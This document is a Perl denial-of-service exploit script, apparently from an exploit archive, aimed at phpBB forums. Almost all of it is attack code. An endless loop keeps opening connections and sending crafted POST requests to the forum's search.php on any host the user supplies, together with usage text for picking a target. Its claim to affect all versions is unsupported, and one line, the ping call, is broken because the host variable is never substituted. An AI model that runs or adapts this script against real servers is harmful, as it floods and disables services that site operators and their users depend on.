###########################

# Phpbb Forum Denial of Service Vulnerability

###########################

#!/usr/bin/perl
# Iranian Exploit DataBase
# Phpbb Forum Denial of Service Vulnerability
# Version: All Version
# Vendor site : http://www.phpbb.com
# Code Written By Amir - iedb.team@gmail.com - o0_iedb_0o@yahoo.com
# Site : Www.IeDb.Ir   -   Www.IrIsT.Ir
# Fb Page : 
https://www.facebook.com/pages/Exploit-And-Security-Team-iedbir/199266860256538
# Greats : TaK.FaNaR - ErfanMs - Medrik - F@riD - Bl4ck M4n - 0x0ptim0us 
- 0Day - Dj.TiniVini - E2MA3N 
#  l4tr0d3ctism - H-SK33PY - Noter - r3d_s0urc3 - Dr_Evil And All 
Members In IeDb.Ir/acc
#####################################
use Socket;
if (@ARGV < 2) { &usage }
$rand=rand(10);
$host = $ARGV[0];
$dir = $ARGV[1];
$host =~ s/(http:\/\/)//eg;
for ($i=0; $i<10; $i--)
{
$data = 
"securitytoken=guest&do=process&query=%DB%8C%D8%B3%D8%A8%D9%84%D8%B3%DB%8C%D9%84%D8%B3%DB%8C%D8%A8%D9%84%0%0%0%0%0%0%0%0%0%0&submit.x=0&submit.y=0";
$len = length $data;
$foo = "POST ".$dir."search.php?do=process HTTP/1.1\r\n".
"Accept: * /*\r\n".
"Accept-Language: en-gb\r\n".
"Content-Type: application/x-www-form-urlencoded\r\n".
"Accept-Encoding: gzip, deflate\r\n".
"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n".
"Host: $host\r\n".
"Content-Length: $len\r\n".
"Connection: Keep-Alive\r\n".
"Cache-Control: no-cache\r\n\r\n".
"$data";
my $port = "80";
my $proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
connect(SOCKET, sockaddr_in($port, inet_aton($host))) || redo;
send(SOCKET,"$foo", 0);
syswrite STDOUT, "+" ;
}
print "\n\n";
system('ping $host');
sub usage {
print "\n";
print "################################################# \n";
print "##       Phpbb Forum Denial of Service Vulnerability\n";
print "## Discoverd By Amir - iedb.team@gmail.com - Id : o0_iedb_0o \n";
print "##            Www.IeDb.Ir   -   Www.IrIsT.Ir \n";
print "################################################# \n";
print "## [host] [path] \n";
print "## http://host.com /forum/\n";
print "################################################# \n";
print "\n";
exit();
};
#####################################
#  Archive Exploit = http://www.iedb.ir/exploits-868.html
#####################################

###########################

# Iranian Exploit DataBase = http://IeDb.Ir [2013-11-17]

###########################
